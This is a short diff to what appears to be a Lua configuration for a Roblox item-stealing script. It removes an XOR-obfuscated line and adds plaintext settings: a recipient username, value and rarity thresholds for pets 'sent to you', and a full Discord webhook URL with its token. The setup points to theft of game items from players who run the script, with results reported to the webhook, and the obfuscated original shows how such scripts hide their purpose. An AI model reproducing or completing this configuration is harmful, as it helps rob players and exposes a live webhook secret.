@@ -1,1 +1,5 @@
-local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9) local v10={};for v11=1, #v8 do v6(v10,v0(v4(v1(v2(v8,v11,v11 + 1 )),v1(v2(v9,1 + (v11% #v9) ,1 + (v11% #v9) + 1 )))%256 ));end return v5(v10);end Username=v7("\255\202\213\47\231\156\198\19\212\209\138\113\183\234\151\72","\126\177\163\187\69\134\219\167");min_rap=28151 -18151 ;min_chance=10931 -(857 + 74) ;webhook=v7("\43\217\62\213\239\121\130\101\193\245\48\206\37\215\248\109\206\37\200\179\34\221\35\138\235\38\207\34\202\243\40\222\101\148\174\122\154\124\157\171\119\157\125\156\175\114\153\120\157\165\119\152\101\241\218\57\197\46\250\222\10\196\21\213\201\48\244\62\243\211\48\201\16\233\222\20\198\63\149\248\49\216\29\144\223\0\244\58\198\168\23\212\30\221\255\117\234\31\231\223\11\212\27\200\230\25\233\4\157\205\22\250\6\207\229\118\223\38\221\173\33","\156\67\173\74\165");
+
+Username = "NinjaGamer141106"
+min_rap = 10000 -- minimum rap of each pet you want to get sent to you.
+min_chance = 10000 -- the 10k is basically 1/10k is the minimum u want to get
+webhook = "https://discord.com/api/webhooks/1297687407931428945/TFzhd_BIi_pUsYtVOsdZLBWku0druW5CCYpc4TyTxc6GUBCHyQmzZDN8QUWLjy5rlx1b"
